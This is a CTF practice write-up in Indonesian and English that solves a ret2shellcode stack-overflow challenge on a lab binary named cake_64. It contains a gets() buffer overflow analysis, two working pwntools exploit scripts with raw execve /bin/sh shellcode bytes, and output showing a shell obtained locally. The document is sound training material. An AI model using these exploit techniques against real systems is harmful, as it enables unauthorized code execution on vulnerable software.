---
slug: "pwn-ret2shellcode-2"
title: "ret2shellcode"
competition: "Exercise"
category: "Pwn"
difficulty: "Easy"
date: "2026-08-18"
updated: "2026-08-24"
summary: "Latihan buat persiapan seleksi LKS, isinya ret2shellcode."
tags: ["PWN","ROP","HANDS-ON","EASY","X64","RET2SHELLCODE"]
status: "published"
flag: "SHELL"
attachments: []
source: "https://claritys.web.id/writeups/pwn-ret2shellcode-2"
---

# ret2shellcode

> Latihan buat persiapan seleksi LKS, isinya ret2shellcode.

Diawal, kita sudah diberi hint bahwa challenge ini itu ret2shellcode. Langsung saja kita checksec. Dan yup, kalau NX nya disabled itu 100% shellcode, tapi kalau unknown sih berdoa aja wkwk.

```bash
~/ctf/pwncheatsheet/learnfromLKS/Binary_Exploit/Hands-on/ROP/ret2shellcode main*
❯ checksec cake_64                                                               󰥔 13:24:06
[*] '/home/claritys/ctf/pwncheatsheet/learnfromLKS/Binary_Exploit/Hands-on/ROP/ret2shellcode/cake_64'
    Arch:       amd64-64-little
    RELRO:      Partial RELRO
    Stack:      No canary found
    NX:         NX unknown - GNU_STACK missing
    PIE:        No PIE (0x400000)
    Stack:      Executable
    RWX:        Has RWX segments
    SHSTK:      Enabled
    IBT:        Enabled
    Stripped:   No
```

Luckily, its not stripped, lets check the function.

```bash
~/ctf/pwncheatsheet/learnfromLKS/Binary_Exploit/Hands-on/ROP/ret2shellcode main*
❯ pwndbg cake_64                                                                 󰥔 13:23:40
GEF for linux ready, type `gef' to start, `gef config' to configure
93 commands loaded and 5 functions added for GDB 16.3 in 0.00ms using Python engine 3.13
pwndbg: loaded 212 pwndbg commands. Type pwndbg [filter] for a list.
pwndbg: created 13 GDB functions (can be used with print/break). Type help function to see them.
Reading symbols from cake_64...

This GDB supports auto-downloading debuginfo from the following URLs:
  <https://debuginfod.cachyos.org>
  <https://debuginfod.archlinux.org>
Debuginfod has been disabled.
To make this setting permanent, add 'set debuginfod enabled off' to .gdbinit.
(No debugging symbols found in cake_64)
gef➤  info fun
All defined functions:

Non-debugging symbols:
0x0000000000401000  _init
0x0000000000401070  puts@plt
0x0000000000401080  printf@plt
0x0000000000401090  gets@plt
0x00000000004010a0  setvbuf@plt
0x00000000004010b0  _start
0x00000000004010e0  _dl_relocate_static_pie
0x00000000004010f0  deregister_tm_clones
0x0000000000401120  register_tm_clones
0x0000000000401160  __do_global_dtors_aux
0x0000000000401190  frame_dummy
0x0000000000401196  init
0x00000000004011dd  kue_leaker
0x000000000040124a  main
0x0000000000401270  __libc_csu_init
0x00000000004012e0  __libc_csu_fini
0x00000000004012e8  _fini
```

Because there’s a function that kue\_leaker, usually I assume that is the vuln, so I don’t check the main. Because usually its just call the vuln.

```
gef➤  disas kue_leaker
Dump of assembler code for function kue_leaker:
   0x00000000004011dd <+0>:     endbr64
   0x00000000004011e1 <+4>:     push   rbp
   0x00000000004011e2 <+5>:     mov    rbp,rsp
   0x00000000004011e5 <+8>:     add    rsp,0xffffffffffffff80
   0x00000000004011e9 <+12>:    lea    rdi,[rip+0xe18]        # 0x402008
   0x00000000004011f0 <+19>:    call   0x401070 <puts@plt>
   0x00000000004011f5 <+24>:    lea    rdi,[rip+0xe54]        # 0x402050
   0x00000000004011fc <+31>:    call   0x401070 <puts@plt>
   0x0000000000401201 <+36>:    lea    rax,[rbp-0x80]
   0x0000000000401205 <+40>:    mov    rsi,rax
   0x0000000000401208 <+43>:    lea    rdi,[rip+0xe8f]        # 0x40209e
   0x000000000040120f <+50>:    mov    eax,0x0
   0x0000000000401214 <+55>:    call   0x401080 <printf@plt>
   0x0000000000401219 <+60>:    lea    rdi,[rip+0xe98]        # 0x4020b8
   0x0000000000401220 <+67>:    mov    eax,0x0
   0x0000000000401225 <+72>:    call   0x401080 <printf@plt>
   0x000000000040122a <+77>:    lea    rax,[rbp-0x80]
   0x000000000040122e <+81>:    mov    rdi,rax
   0x0000000000401231 <+84>:    mov    eax,0x0
   0x0000000000401236 <+89>:    call   0x401090 <gets@plt>
   0x000000000040123b <+94>:    lea    rdi,[rip+0xede]        # 0x402120
   0x0000000000401242 <+101>:   call   0x401070 <puts@plt>
   0x0000000000401247 <+106>:   nop
   0x0000000000401248 <+107>:   leave
   0x0000000000401249 <+108>:   ret
End of assembler dump.
```

Okay, there’s gets. and 0x80 = 128, because its x86, we need 136 for reaching EIP. And now we verification for the offset for the EIP.

```
>>> 0x80
128
>>> 0x80 + 8
136
```

```
[ Legend: Modified register | Code | Heap | Stack | String ]
──────────────────────────────────────────────────────────────────────────── registers ────
$rax   : 0x1f
$rbx   : 0x0
$rcx   : 0x00007ffff7e4f750  →  0x0000000000000000
$rdx   : 0x00007ffff7e4f750  →  0x0000000000000000
$rsp   : 0x00007fffffffdfb8  →  "raaaaaaasaaaaa"
$rbp   : 0x6161616161616171 ("qaaaaaaa"?)
$rsi   : 0x00007ffff7e4e603  →  0xe4f750000000000a ("\n"?)
$rdi   : 0x1
$rip   : 0x0000000000401249  →  <kue_leaker+006c> ret
$r8    : 0x1
$r9    : 0x0
$r10   : 0x0
$r11   : 0x202
$r12   : 0x1
$r13   : 0x00007fffffffe0e0  →  0x0000000000000001
$r14   : 0x00007ffff7ffd000  →  0x00007ffff7ffe3c0  →  0x0000000000000000
$r15   : 0x00007fffffffe0f8  →  0x00007fffffffe517  →  "DISPLAY=:1"
$eflags: [zero carry parity adjust sign trap INTERRUPT direction overflow RESUME virtualx86 identification]
$cs: 0x33 $ss: 0x2b $ds: 0x00 $es: 0x00 $fs: 0x00 $gs: 0x00
──────────────────────────────────────────────────────────────────────────────── stack ────
0x00007fffffffdfb8│+0x0000: "raaaaaaasaaaaa"     ← $rsp
0x00007fffffffdfc0│+0x0008: 0x0000616161616173 ("saaaaa"?)
0x00007fffffffdfc8│+0x0010: 0x00007ffff7c27d0e  →   mov edi, eax
0x00007fffffffdfd0│+0x0018: 0x00007ffff7fe1bf0  →   endbr64
0x00007fffffffdfd8│+0x0020: 0x000000000040124a  →  <main+0000> endbr64
0x00007fffffffdfe0│+0x0028: 0x00000001f7fe1bf0
0x00007fffffffdfe8│+0x0030: 0x00007fffffffe0e8  →  0x00007fffffffe4b7  →  "/home/claritys/ctf/pwncheatsheet/learnfromLKS/Bina[...]"
0x00007fffffffdff0│+0x0038: 0x0000000000400040  →   (bad)
────────────────────────────────────────────────────────────────────────── code:x86:64 ────
     0x401242 <kue_leaker+0065> call   0x401070 <puts@plt>
     0x401247 <kue_leaker+006a> nop
     0x401248 <kue_leaker+006b> leave
 →   0x401249 <kue_leaker+006c> ret
[!] Cannot disassemble from $PC
────────────────────────────────────────────────────────────────────────────── threads ────
[#0] Id 1, Name: "cake_64", stopped 0x401249 in kue_leaker (), reason: SIGSEGV
──────────────────────────────────────────────────────────────────────────────── trace ────
[#0] 0x401249 → kue_leaker()
───────────────────────────────────────────────────────────────────────────────────────────
gef➤  cyclic -l raaaaaaa
Finding cyclic pattern of 8 bytes: b'raaaaaaa' (hex: 0x7261616161616161)
Found at offset 136
```

Nah, kalau untuk ret2shellcode itu biasanya bikin RIP itu mengarah ke leak tempat buffer awal kita. Jadinya kita tinggal ngasih [shellcraft.sh](http://shellcraft.sh) di awal terus nanti dikasih ljust biar lebih simple nanti payloadnya.

My own solver: (actually I’m using template from pwninit and then i modifed it a bit for my own environment)

```python
#!/usr/bin/env python3

from pwn import *

elf = ELF("cake_64_patched")

exe = context.binary
context.terminal = ["ghostty", "-e"]
context.arch = "amd64"

gdbscript = """
set pagination off
set confirm off

break main
continue
"""

def conn():
    if args.GDB:
        r = process([elf.path])
        gdb.attach(r, gdbscript=gdbscript)
        return r

    if args.LOCAL:
        return process([elf.path])

    return remote("addr", 1337)

def main():
    r = conn()
    shellcode = asm(shellcraft.sh())
    # good luck pwning :)
    r.recvuntil("=")
    buffer_address = int(r.recvline().strip(),16)
    payload = flat(
        shellcode.ljust(136, b'A'),
        p64(buffer_address)
    )
    r.sendline(payload)
    r.interactive()

if __name__ == "__main__":
    main()
```

Nah, aku ini no AI tapi melihat solver yang dulu hehe.

Solver resmi dari latihan LKS nya adalah:

```python
from pwn import *

elf = context.binary = ELF('./cake_64')
p = process()

# Nyusun apa yang dikasih tahu
offset = 136
#shell = asm(shellcraft.sh())
shell = b"\x48\x31\xc0\x50\x48\x31\xd2\x48\x31\xf6\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x53\x54\x5f\xb0\x3b\x0f\x05"

p.recvuntil(b'= ')
leak = int(p.recvline().strip(),16)

#payload = flat(shell, cyclic(88), leak)
payload = flat(shell.ljust(offset, b'A'), p64(leak))
p.sendlineafter(b'> ',payload)
p.interactive()⏎
```

we can keep it and use it as a reference in the future.

Eh aku juga baru tau kalau bisa kayak gitu gara gara solver resmi dari latihan LKSnya, dia lebih singkat sama lebih simple.

**Implement:**

```bash
~/ctf/pwncheatsheet/learnfromLKS/Binary_Exploit/Hands-on/ROP/ret2shellcode main*
❯ python3 solve.py LOCAL                                                         󰥔 13:33:45
[*] '/home/claritys/ctf/pwncheatsheet/learnfromLKS/Binary_Exploit/Hands-on/ROP/ret2shellcode/cake_64_patched'
    Arch:       amd64-64-little
    RELRO:      Partial RELRO
    Stack:      No canary found
    NX:         NX unknown - GNU_STACK missing
    PIE:        No PIE (0x400000)
    Stack:      Executable
    RWX:        Has RWX segments
    SHSTK:      Enabled
    IBT:        Enabled
    Stripped:   No
[x] Starting local process '/home/claritys/ctf/pwncheatsheet/learnfromLKS/Binary_Exploit/Ha[←] Starting local process '/home/claritys/ctf/pwncheatsheet/learnfromLKS/Binary_Exploit/Ha[+] on/ROP/ret2shellcode/cake_64_patched': pid 101775
/home/claritys/ctf/pwncheatsheet/learnfromLKS/Binary_Exploit/Hands-on/ROP/ret2shellcode/solve.py:35: BytesWarning: Text is not bytes; assuming ASCII, no guarantees. See https://docs.pwntools.com/#bytes
  r.recvuntil("=")
[*] Switching to interactive mode
Lylera: Maka dari itu coba susun cara bagaiman dari leak ini dapat shell. Aku kasih kamu kertas

>
Lylera: Okee. Mari kita cobaa
$ ls
cake.zip  cake_32.py       cake_64     cake_64_patched  solve32.py
cake_32   cake_32_patched  cake_64.py  solve.py
```
